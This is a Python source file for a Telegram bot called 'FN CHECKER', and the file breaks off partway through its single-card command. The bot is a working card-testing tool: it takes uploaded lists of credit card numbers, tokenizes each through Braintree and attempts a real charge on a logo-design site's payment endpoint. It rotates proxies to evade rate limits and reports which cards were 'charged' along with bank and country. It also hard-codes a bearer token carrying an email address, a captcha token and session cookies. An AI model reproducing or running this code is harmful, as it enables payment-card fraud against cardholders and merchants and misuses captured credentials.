import os
import time
import asyncio
import requests
import aiofiles
import logging
import random
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# Set up logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Global variables to track checking state, stats, and proxies
checking_active = False
stats = {
    'approved': 0,
    'declined': 0,
    'checked': 0,
    'total': 0,
    'start_time': 0
}
proxies_list = []  # List to store valid proxies

# Function to load and validate proxies from proxies.txt
def load_proxies():
    global proxies_list
    proxies_list = []
    proxy_file = 'proxies.txt'
    
    if not os.path.exists(proxy_file):
        logger.error("proxies.txt file not found!")
        return False
    
    with open(proxy_file, 'r') as f:
        lines = f.readlines()
        if not lines:
            logger.error("proxies.txt is empty!")
            return False
        
        for line in lines:
            proxy = line.strip()
            if not proxy:
                continue
            # Test the proxy by making a simple request
            try:
                test_url = "https://api.ipify.org"  # Simple endpoint to check IP
                proxy_dict = {
                    "http": proxy,
                    "https": proxy
                }
                response = requests.get(test_url, proxies=proxy_dict, timeout=5)
                if response.status_code == 200:
                    proxies_list.append(proxy)
                    logger.debug(f"Valid proxy found: {proxy}")
                else:
                    logger.warning(f"Proxy failed with status {response.status_code}: {proxy}")
            except requests.exceptions.RequestException as e:
                logger.warning(f"Proxy failed: {proxy} - Error: {e}")
    
    if not proxies_list:
        logger.error("No valid proxies found in proxies.txt. All proxies are expired or not working.")
        return False
    
    logger.info(f"Loaded {len(proxies_list)} valid proxies.")
    return True

# Function to get a specified number of unique proxies
def get_unique_proxies(num_proxies):
    if len(proxies_list) < num_proxies:
        logger.warning(f"Not enough proxies available. Requested: {num_proxies}, Available: {len(proxies_list)}")
        return None
    selected_proxies = random.sample(proxies_list, num_proxies)
    return [{"http": proxy, "https": proxy} for proxy in selected_proxies]

# API function to tokenize a credit card using Braintree (with proxy support)
def b3req(cc, mm, yy, proxy):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjY3ZDhjZWU0ZTYwYmYwMzYxNmM1ODg4NTJiMjA5MTZkNjRjMzRmYmEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vYnJhbmRtYXJrLWlvIiwiYXVkIjoiYnJhbmRtYXJrLWlvIiwiYXV0aF90aW1lIjoxNzQ3ODkzMjg4LCJ1c2VyX2lkIjoiWlI2NzJQRlAyaFFoNU1GbVZ3WUVYQ0FTWmQ4MiIsInN1YiI6IlpSNjcyUEZQMmhRaDVNRm1Wd1lFWENBU1pkODIiLCJpYXQiOjE3NDc4OTMyODgsImV4cCI6MTc0Nzg5Njg4OCwiZW1haWwiOiJlbGVjdHJhb3AwOUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZWxlY3RyYW9wMDlAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.LZ0LSpm22zwbkwjgo_7mbHVYiJ0WOCwfixWh0HeFX6MX6eufsN1mer0QnXm3lstpACuIbNevfAmuxvGRnHOy1ZGXVEtzYWAIpYVHVDPlS69mgDYOv-b3x9i4O_m3rRYk1I-21sRKw2RoeYHE4x4wmyzKcUWl9EDv1Jz3bUHrmrKpky2Vsrp5FrZlywD1Ry6QRMIv9j1WEhhPwFekLFUMD6v_h7n8h_4okCtoAhjiZLGCwrcIc_LgmJyqkZqdIoJACtbGjojb7qq7oC0JxDJ_7G606CwppNGbAYx9KSNOW7C2FooSIpRTmZWnjo4-tpYpAahKw8gf-3DPLVxCT-n4vA',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'fab6924a-b151-43b5-a68a-0ff870cab793',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': f'{cc}',
                    'expirationMonth': f'{mm}',
                    'expirationYear': f'{yy}',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    logger.debug(f"Sending Braintree request for cc: {cc}, mm: {mm}, yy: {yy} with proxy: {proxy}")
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy, timeout=10)
        logger.debug(f"Braintree API response status code: {response.status_code}")
        logger.debug(f"Braintree API response text: {response.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Braintree request failed with proxy {proxy}: {e}")
        return None, None, None, None, None, None, None, None

    try:
        resjson = response.json()
        logger.debug(f"Parsed Braintree JSON response: {resjson}")
    except requests.exceptions.JSONDecodeError as e:
        logger.error(f"Braintree JSON Decode Error: {e}")
        return None, None, None, None, None, None, None, None
    if 'data' not in resjson or not resjson['data']:
        logger.error("Braintree response has no 'data' key or data is empty")
        return None, None, None, None, None, None, None, None
    try:
        tkn = resjson['data']['tokenizeCreditCard']['token']
        mm = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationMonth"]
        yy = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationYear"]
        bin = resjson["data"]["tokenizeCreditCard"]["creditCard"]["bin"]
        card_type = resjson["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
        lastfour = resjson["data"]["tokenizeCreditCard"]["creditCard"]["last4"]
        lasttwo = lastfour[-2:]
        bin_data = resjson["data"]["tokenizeCreditCard"]["creditCard"]["binData"]
        logger.debug(f"Braintree tokenization successful: tkn={tkn}, mm={mm}, yy={yy}, bin={bin}, card_type={card_type}, lastfour={lastfour}")
        return tkn, mm, yy, bin, card_type, lastfour, lasttwo, bin_data
    except KeyError as e:
        logger.error(f"Braintree KeyError in response parsing: {e}")
        return None, None, None, None, None, None, None, None

# API function to process a payment using Brandmark (with proxy support)
def brainmarkreq(b3tkn, mm, yy, bin, Type, lastfour, lasttwo, proxy):
    cookies2 = {
        '_ga': 'GA1.2.1451620456.1741715570',
        '_gid': 'GA1.2.354116258.1741803158',
        '_gat': '1',
        '_ga_93VBC82KGM': 'GS1.2.1741803158.2.1.1741803214.0.0.0',
    }
    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.brandmark.io',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.brandmark.io/v3/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data2 = {
        'tier': 'basic',
        'email': 'electraop09@gmail.com',
        'payload': {
            'nonce': f'{b3tkn}',
            'details': {
                'expirationMonth': f'{mm}',
                'expirationYear': f'{yy}',
                'bin': f'{bin}',
                'cardType': f'{Type}',
                'lastFour': f'{lastfour}',
                'lastTwo': f'{lasttwo}',
            },
            'type': 'CreditCard',
            'description': 'ending in 82',
            'deviceData': '{"device_session_id":"c88fc259a79674be1f35baf6865f6158","fraud_merchant_id":null,"correlation_id":"e526db6e61b97522af1c8f5a2b2433df"}',
            'binData': {
                'prepaid': 'Yes',
                'healthcare': 'No',
                'debit': 'Yes',
                'durbinRegulated': 'No',
                'commercial': 'Unknown',
                'payroll': 'No',
                'issuingBank': 'THE BANCORP BANK NATIONAL ASSOCIATION',
                'countryOfIssuance': 'USA',
                'productId': 'MPF',
            },
        },
        'discount': False,
        'referral': None,
        'params': {
            'id': 'logo-60bfb4e5-5cfb-4c13-a8bf-689d41d922e6',
            'title': 'FnNetwork',
        },
        'svg': '</svg>\n',
        'recaptcha_token': '03AFcWeA4TUwCBr9ZyKTdeNuQ3kaZbwLSToPQh2h7xg2h3hPnxtNDMVuqW9UtnF8gbrctR_8S2ntpP8vDXM5Q0PWZdHDOX1G2iS14rEwtRh7FLf1K3lQQtXhenokIPJEljQfKYc9__y48fkTHiVB7a4e74DqhsuokXkF48nDXKL9_BhPugu3HzJXwMf8I0CuolQ4LSYwuydKlwcKTdu6C5xH6ku1WvXWibuSxLbUGv2dowWjwaaLzMspAcqJ5etjOQM2z779PIUwjaXUf_FXJ5L45J_0a7ApqiRuqvo8TIPx5HfHVsG3GixP2JWl3SgoRdXTdWwyw1Uu38Pt72PnPKpnouKXwFz_oaqwzVmKB9D9K1LvTkyJ88NlJkf7u_dXGxgZI1i9uQB_Sc-IrNQMtxS7dupRUcnWNPgaQWC3YmiV_p6XOx4Xe_zHXvotCYYr84EzJ6COQkEr0mA_69Q6zoMaZqGz-eK0scIiWeI-Bu85U2uvBl0R25I8Id54wYh_dT1Wr_RL9VkTXcbNiQBRwuj992pW6srtPF5493q8hqEmvToa5SEPh7nvkg_zAt7XtBc0dYMJdGUavNNfEWwon-5dHelGAIdnBIeJFqkIZG3WSU-MPQ_gTWJU6r-GWUlBOtDF4AeUzCnUFIZZS0QW3A1uwElxwAOqdMNp5xPjWB7FauExgRdPsZvkOP-VM9D801PLxxn02jrtqV7zg5DbEUll_82Wuh_XmEx99Gboq-mZniXPlcg0SzO1a-wSnmmr8gsuSx5G1oJQ0u0_OsP6sdzwAz5p1B1vzaMKesMT_iTb_q59rHjfOj5CP1QT7-Zv5G6LYbC_6CEpUc1-7deWlWsetX5EjEU738bqjfp7g2Kl6CsnDNmdb8D9oNQlGySUdAYYtq7-dzQGA8AH5tlwy7PGmgZVvPm3IiDdK5IMInqtTMX0d6G0YwnXQHqc-h9hcsTdmFbrcy1uSpOGbWJvJcOOIrR11lyJ07zPSmryGgiatFDzaT2PLpckwPJULHaYI0hX9dSdCrJ58IlgUahRGtrrKi0UFVWMHMkPMxLKOFhY9-dIQ4ipGRozwk3oAadgIrb9FKRYmNxaNQ9RD6E2GPOzkMF_SKk8WJx2wKeF6brq43XbW1P1eHyTu1e7RrqbD8yppjfMT_eTK67-Z4LxrYe2-3IDZdj5EjWdnLA_ARnx1SJBHdikfXuaKoAZ1UiBydFySYkkVIbvnDrtp_4-SikjBoyQBTScFMVToTNCeFT-LGSlpnFHEZzmp5TzrWiuUC4iGnKsyBQxrINVQJ11MWtQb0IrfTUhmzyx9Z_GEa3-BGylIiZlNKGzswjRv91UONeTYmGvkmC2tS0bBxJjjMTPLZsHc32f6z2h_GRE9mqpLNE3B6UKXi_nqwH85cNBJeHxz1PELDNPhhLVPxgGA7eQN8pUD8vOx1YXboM3fkPGmTgI-vzpRm-kmpqbA-YmcA9syu6uQqyMHlIoy2oV2EDkUBgS2VPemwymCwiXYEZByQ5krI6V8SbGMJ59BryJpIxMRIFKiDmzoG1VvhK4iqxAuyszFjHkx3Fcka_Vu8xPEc37Zz2ZCNhFWXTjuY1rpaPuaxSNU2nO_JtSX3jREP45PwePk7cTHUqxGMDhoIUYApkpF74NU-K4m6Y12PKqtKegZM4yrBFrAPZ0uMHxxXyrSe1rsS_8-_887aitilFAgsTRc1WBfCZn7X6xj0msxhd35K0kWuQA_8SznFMFX7PRtiEdPXbC_pJMgb7Dl5IX1SQ0YWNOBk5DQupUWXxxaULfamqNgRYolXWEsqBCYahlIkQO-n_kgYR2_SEMvM8guj0-hePJSq00sRklRpzlTBa5PDjT1DdhnXHXyjEteTVNqcjFL34OfqwA0Alyn5rilU0jIzgo9bNJYWZq_3t1vmLpuXSYfX1oCrsTGRXuqVoEWc6u643F2f0lUfNK6ZE1ryYxJ0Y_hSkZ-U90ZjHIofPSGbVjkV523FA0blTfkZIqHWWlHLOnVIFRyqke1RqUAUHvH5vTl-W6BVnrt8ulQqs0YBIzaWg4dMP5buwTICuXbmVxTYrFuarb_wKnnyKKmLlJIi7H-wDZetH-N3qPMhPp8ROiSjMRAOvPHtvmFmojIf8qmc-601IPGsiXP71xATn7le6NUdTPI',
        'token': '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',
    }
    logger.debug(f"Sending Brandmark request with nonce: {b3tkn} with proxy: {proxy}")
    try:
        response2 = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies2, headers=headers2, json=json_data2, proxies=proxy, timeout=10)
        logger.debug(f"Brandmark API response status code: {response2.status_code}")
        logger.debug(f"Brandmark API response text: {response2.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Brandmark request failed with proxy {proxy}: {e}")
        return "Error: Proxy failed"

    try:
        res2json = response2.json()
        logger.debug(f"Parsed Brandmark JSON response: {res2json}")
        return res2json['message']
    except (requests.exceptions.JSONDecodeError, KeyError) as e:
        logger.error(f"Brandmark JSON Decode or KeyError: {e}")
        return "Error: Invalid API response"

# Helper function to run synchronous functions in an async context
async def run_sync_func(func, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, func, *args)

# Check if a card was successfully charged based on the API response
def is_charged(message):
    return "success" in message.lower()

# Process a single card (used in concurrent processing)
async def process_card(card_details, proxy, update, context):
    card_number, expiry_month, expiry_year, _ = card_details.split('|')
    full_card = f"{card_number}|{expiry_month}|{expiry_year}"
    logger.debug(f"Processing card: {full_card}")

    # Start timing for this specific card
    card_start_time = time.time()

    # Process the card
    tkn, mm, yy, bin, card_type, lastfour, lasttwo, bin_data = await run_sync_func(b3req, card_number, expiry_month, expiry_year, proxy)
    if tkn is None:
        logger.error(f"Failed to process card: {card_number}")
        return None, None, None, None

    final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo, proxy)

    # End timing for this specific card
    card_end_time = time.time()
    card_duration = card_end_time - card_start_time

    return full_card, final, bin_data, card_duration

# Process a text file containing card details with concurrency
async def process_file(file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active, stats
    checking_active = True
    stats['start_time'] = time.time()
    stats['total'] = 0
    stats['checked'] = 0
    stats['approved'] = 0
    stats['declined'] = 0
    charged_cards = []  # List to store charged cards

    lines = []
    async with aiofiles.open(file_path, 'r') as f:
        async for line in f:
            lines.append(line.strip())
    stats['total'] = len(lines)
    if stats['total'] == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="File is empty!")
        checking_active = False
        return

    # Get user info for the "CHECKED BY" field
    user_name = update.effective_user.first_name or update.effective_user.username or "Unknown User"
    user_id = update.effective_user.id
    profile_link = f"tg://user?id={user_id}"  # Link to user's Telegram profile

    # Developer and Bot links
    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"  # Replace with actual developer Telegram link
    bot_name = "FN CHECKER"
    bot_link = "https://t.me/FN_CHECKER_BOT"  # Replace with actual bot Telegram link

    # Process cards in batches of 3
    batch_size = 3
    for i in range(0, len(lines), batch_size):
        if not checking_active:
            break

        batch = lines[i:i + batch_size]
        # Filter out invalid lines
        batch = [line for line in batch if '|' in line and len(line.split('|')) == 4]
        if not batch:
            continue

        # Get unique proxies for this batch
        proxies = get_unique_proxies(len(batch))
        if not proxies:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Not enough valid proxies available to process this batch. Please add more proxies to proxies.txt.")
            checking_active = False
            return

        # Process the batch concurrently
        tasks = []
        for card, proxy in zip(batch, proxies):
            proxy_status = "Live" if proxy else "Dead"
            tasks.append(process_card(card, proxy, update, context))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Process the results
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Error processing card: {result}")
                stats['declined'] += 1
                stats['checked'] += 1
                continue

            if result[0] is None:  # Card processing failed
                stats['declined'] += 1
                stats['checked'] += 1
                continue

            full_card, final, bin_data, card_duration = result
            stats['checked'] += 1

            if is_charged(final):
                stats['approved'] += 1
                charged_cards.append(full_card)

                # Extract BIN (first 6 digits of the card number)
                card_bin = full_card[:6]

                # Extract bank and country info from bin_data
                bank = bin_data.get('issuingBank', 'Unknown') if bin_data else 'Unknown'
                country_code = bin_data.get('countryOfIssuance', 'USA').upper() if bin_data else 'USA'

                # Mapping country codes to full names and flags
                country_mapping = {
                    'USA': ('United States', '🇺🇸'),
                    'THA': ('Thailand', '🇹🇭'),
                    'IND': ('India', '🇮🇳'),
                    'GBR': ('United Kingdom', '🇬🇧'),
                    'CAN': ('Canada', '🇨🇦'),
                    'AUS': ('Australia', '🇦🇺'),
                    'FRA': ('France', '🇫🇷'),
                    'DEU': ('Germany', '🇩🇪'),
                    'JPN': ('Japan', '🇯🇵'),
                    'CHN': ('China', '🇨🇳'),
                }
                country_full, country_flag = country_mapping.get(country_code, ('Unknown', '🇺🇳'))

                # Format the message for charged cards
                charged_message = f"""
<b>CHARGED 25$ 😈⚡</b>

<b>[ϟ]CARD -»</b> {full_card}
<b>[ϟ]STATUS -»</b> Charged 25$
<b>[ϟ]GATEWAY -»</b> Braintree
<b>[ϟ]RESPONSE -»</b> {final}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>[ϟ]BIN -»</b> {card_bin}
<b>[ϟ]BANK -»</b> {bank}
<b>[ϟ]COUNTRY -»</b> {country_full} {country_flag}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>[⌬]TIME -»</b> {card_duration:.2f} seconds
<b>[⌬]PROXY -»</b> Live

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>[⌬]CHECKED BY -»</b> <a href="{profile_link}">{user_name}</a>
<b>[⌬]DEV -»</b> <a href="{dev_link}">{dev_name}</a>
<b>[み]Bot -»</b> <a href="{bot_link}">{bot_name}</a>
"""
                await context.bot.send_message(chat_id=update.effective_chat.id, text=charged_message, parse_mode='HTML')
            else:
                stats['declined'] += 1
                # Do not send a message for declined cards

        # Send progress update every 50 cards or at the end
        if stats['checked'] % 50 == 0 or stats['checked'] == stats['total']:
            duration = time.time() - stats['start_time']
            avg_speed = stats['checked'] / duration if duration > 0 else 0
            success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> {stats['approved']}
<b>[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> {stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {stats['checked']}/{stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=update.effective_chat.id, text=progress_message, parse_mode='HTML')

        # Wait for 45 seconds before processing the next batch
        if i + batch_size < len(lines):  # Only wait if there are more cards to process
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Waiting 45 seconds to avoid rate limiting...")
            await asyncio.sleep(45)

    # After checking is complete, create the hits file
    if charged_cards:
        # Generate a random number for the file name
        random_number = random.randint(1000, 9999)
        hits_file_name = f"hits_FnChecker_{random_number}.txt"
        hits_file_path = os.path.join('temp', hits_file_name)

        # Write charged cards to the hits file in the specified format
        hits_content = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] FN CHECKER HITS
━━━━━━━━━━━━━━━━━━━━━━
[✪] Charged: {stats['approved']}
[✪] Total: {stats['total']}
━━━━━━━━━━━━━━━━━━━━━━
[み] DEV: @FNxELECTRA
━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━
FN CHECKER HITS
━━━━━━━━━━━━━━━━━━━━━━
"""
        for card in charged_cards:
            hits_content += f"CHARGED😈⚡-» {card}\n"

        async with aiofiles.open(hits_file_path, 'w') as f:
            await f.write(hits_content)

        # Calculate final stats for the summary message
        duration = time.time() - stats['start_time']
        avg_speed = stats['checked'] / duration if duration > 0 else 0
        success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0

        # Prepare the summary message
        summary_message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] FN CHECKER HITS
━━━━━━━━━━━━━━━━━━━━━━
[✪] Charged: {stats['approved']}
[❌] Declined: {stats['declined']}
[✪] Total: {stats['total']}
[✪] Duration: {duration:.2f} seconds
[✪] Avg Speed: {avg_speed:.2f} cards/sec
[✪] Success Rate: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] DEV: <a href="{dev_link}">{dev_name}</a>
━━━━━━━━━━━━━━━━━━━━━━
"""

        # Send the hits file and summary message
        with open(hits_file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=hits_file_name,
                caption=summary_message,
                parse_mode='HTML'
            )

    checking_active = False

# Handle document uploads (text files with card details)
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("Please send a .txt file.")
        return
    file = await document.get_file()
    os.makedirs('temp', exist_ok=True)
    file_path = os.path.join('temp', document.file_name)
    await file.download_to_drive(file_path)
    await update.message.reply_text("✅ File received! Starting checking...\n⚡ Progress will be updated every 50 cards")
    await process_file(file_path, update, context)

# Handle /chk command for checking a single card
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /chk <cc|mm|yy|cvv>")
        return
    cc_input = context.args[0]
    if '|' not in cc_input or len(cc_input.split('|')) != 4:
        await update.message.reply_text("Invalid format. Use: /chk cc|mm|yy|cvv")
        return
    card_number, expiry_month, expiry_year, cvv = cc_input.split('|')
    full_card_details = f"{card_number}|{expiry_month}|{expiry_year}|{cvv}"
    logger.debug(f"Checking single card: {full_card_details}")

    # Initial response
    initial_message = f"""
𝗖𝗮𝗿𝗱: {full_card_details}
𝗦𝘁𝗮𝘁𝘂𝘀: Checking...
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: ■■■□
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree 25$
"""
